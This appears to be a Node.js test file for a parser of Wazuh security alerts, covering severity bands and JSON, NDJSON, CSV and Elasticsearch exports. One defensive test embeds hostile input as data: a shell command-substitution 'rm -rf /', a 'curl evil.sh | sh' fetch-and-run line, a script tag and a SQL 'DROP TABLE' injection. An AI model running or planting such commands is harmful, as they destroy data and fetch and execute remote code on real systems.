'use strict';
const { test } = require('node:test');
const assert = require('node:assert');
const wazuh = require('../src/services/parser/wazuh');
const { severityFromLevel } = require('../src/services/parser/normalize');

const sampleAlert = {
  id: '1699999999.123',
  timestamp: '2026-09-20T10:00:00Z',
  rule: {
    id: '5712',
    level: 10,
    description: 'sshd: Multiple authentication failures',
    groups: ['sshd', 'authentication_failures', 'brute_force'],
    mitre: { id: ['T1110'], tactic: ['Credential Access'], technique: ['Brute Force'] },
  },
  agent: { name: 'web01', ip: '10.0.0.5' },
  data: { srcip: '203.0.113.9', dstuser: 'root' },
  full_log: 'Failed password for root from 203.0.113.9',
};

test('severity mapping follows documented bands', () => {
  assert.equal(severityFromLevel(15), 'Critical');
  assert.equal(severityFromLevel(12), 'Critical');
  assert.equal(severityFromLevel(10), 'High');
  assert.equal(severityFromLevel(7), 'Medium');
  assert.equal(severityFromLevel(3), 'Low');
  assert.equal(severityFromLevel(undefined), 'Low');
});

test('parses Wazuh JSON array and normalizes fields', () => {
  const { events } = wazuh.parse(JSON.stringify([sampleAlert]), 'json');
  assert.equal(events.length, 1);
  const e = events[0];
  assert.equal(e.event_id, '1699999999.123');
  assert.equal(e.rule_id, '5712');
  assert.equal(e.rule_level, 10);
  assert.equal(e.severity, 'High');
  assert.equal(e.src_ip, '203.0.113.9');
  assert.equal(e.dst_user, 'root');
  assert.equal(e.agent_name, 'web01');
  assert.deepEqual(e.mitre_ids, ['T1110']);
  assert.ok(e.groups.includes('brute_force'));
});

test('parses NDJSON (one object per line) and skips malformed lines', () => {
  const nd = JSON.stringify(sampleAlert) + '\n{bad json}\n' + JSON.stringify({ ...sampleAlert, id: 'x2' });
  const { events } = wazuh.parse(nd, 'json');
  assert.equal(events.length, 2);
});

test('parses Wazuh CSV with dotted headers', () => {
  const csv =
    'id,timestamp,rule.id,rule.level,rule.description,rule.groups,rule.mitre.id,agent.name,data.srcip,data.dstuser,full_log\n' +
    '1.1,2026-09-20T10:00:00Z,5712,10,Multiple auth failures,"sshd,brute_force",T1110,web01,203.0.113.9,root,failed';
  const { events } = wazuh.parse(csv, 'csv');
  assert.equal(events.length, 1);
  const e = events[0];
  assert.equal(e.rule_level, 10);
  assert.equal(e.severity, 'High');
  assert.equal(e.src_ip, '203.0.113.9');
  assert.deepEqual(e.mitre_ids, ['T1110']);
  assert.ok(e.groups.includes('brute_force'));
});

test('parses Elasticsearch-style {hits:{hits:[{_source}]}} export', () => {
  const es = { hits: { hits: [{ _source: sampleAlert }] } };
  const { events } = wazuh.parse(JSON.stringify(es), 'json');
  assert.equal(events.length, 1);
  assert.equal(events[0].severity, 'High');
});

test('treats log content as inert data (no execution / command injection surface)', () => {
  const malicious = {
    ...sampleAlert,
    id: 'evil-1',
    full_log: '$(rm -rf /); `curl evil.sh | sh`; <script>alert(1)</script>',
    data: { srcip: '1.2.3.4"; DROP TABLE events;--' },
  };
  const { events } = wazuh.parse(JSON.stringify([malicious]), 'json');
  const e = events[0];
  // Content is preserved verbatim as a STRING, never interpreted.
  assert.equal(typeof e.full_log, 'string');
  assert.ok(e.full_log.includes('rm -rf'));
  assert.equal(typeof e.src_ip, 'string');
});

test('throws on input with no alerts', () => {
  assert.throws(() => wazuh.parse('[]', 'json'));
  assert.throws(() => wazuh.parse('not json at all', 'json'));
});
